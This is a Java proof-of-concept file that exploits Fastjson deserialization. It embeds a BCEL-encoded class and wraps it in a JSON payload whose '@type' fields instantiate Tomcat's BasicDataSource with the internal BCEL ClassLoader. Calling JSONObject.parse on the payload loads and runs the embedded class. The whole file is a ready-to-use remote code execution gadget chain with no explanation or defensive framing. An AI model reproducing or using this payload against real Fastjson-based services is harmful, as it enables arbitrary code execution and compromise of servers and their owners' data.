package com.firebasky.bcelforfastjson;

import com.alibaba.fastjson.JSONObject;

public class fastjsonBDS {
    public static void main(String[] args) {
        String data = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dPMK$c3$40$Q$7d$db$af$a41$da$daZ$bf$adz$QZ$P$86$aa$e0$a1$c5$8b$e8$vh$a1R$bcn$e2$b6n$cd$87$q$a9$d0$9f$a5$H$F$P$fe$A$7f$948$hKQ$Q$e70$8fyo$e6$cd$ce$7e$7c$be$bd$D8$c6$b6$81$C$W$8b$a8$a0$aac$c9$40$N$cb$gV4$ac2$U$3a2$90$c9$vC$b6$d1$ec3$e4$ce$c2$5b$c1P$b2e$m$$$c7$be$p$a2k$eex$c4T$ec$d0$e5$5e$9fGR$d5S2$97$dc$c9$98a$c7vC$df$g$c8H8$3c$be$9fX$D$k$t$a38$MZ$87G$t$d6$f9M$b7$cd$a0w$5co$ba$c8$e8$85$e3$c8$V$XR9$e8$q$l$8c$f8$p7$a1A$d7$b0fb$j$h$d4$d4$9a$85$86M$T$5b$a83$d4$ff_$c3PVN$96$c7$83$a1u$e5$8c$84$9b$fc$a2z$938$R$3e$5d$g$8eI$a8$d9$a9$oC$ab$h$c9$m$e9$r$91$e0$3e$bd$b4$fa$H$cd$a0$3d$a8$ca$Lh$aea$ff$b0L$88$k$b6$9b$7d$ec$oO$7f$ac$o$D$a6n$a1$5c$a4$ca$od$84$f9$fdW$b0$a7T6$u$XR2$8b9$ca$e6w$D$e1$3c$a1$8e$85$d9$f0$ku$ab$u$3e$pS$c9$be$m$a7$MXj$60$a4R$9eZ$95U$v5$$$7f$B$S$bfv$X$f1$B$A$A";
        String payload = "{\n" +
                "  \"@type\" : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "  \"driverClassName\" : \""+data+"\",\n" +
                "  \"driverClassLoader\" :\n" +
                "  {\n" +
                "    \"@type\":\"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;\"\n" +
                "  }\n" +
                "}";
        JSONObject.parse(payload);
    }
}
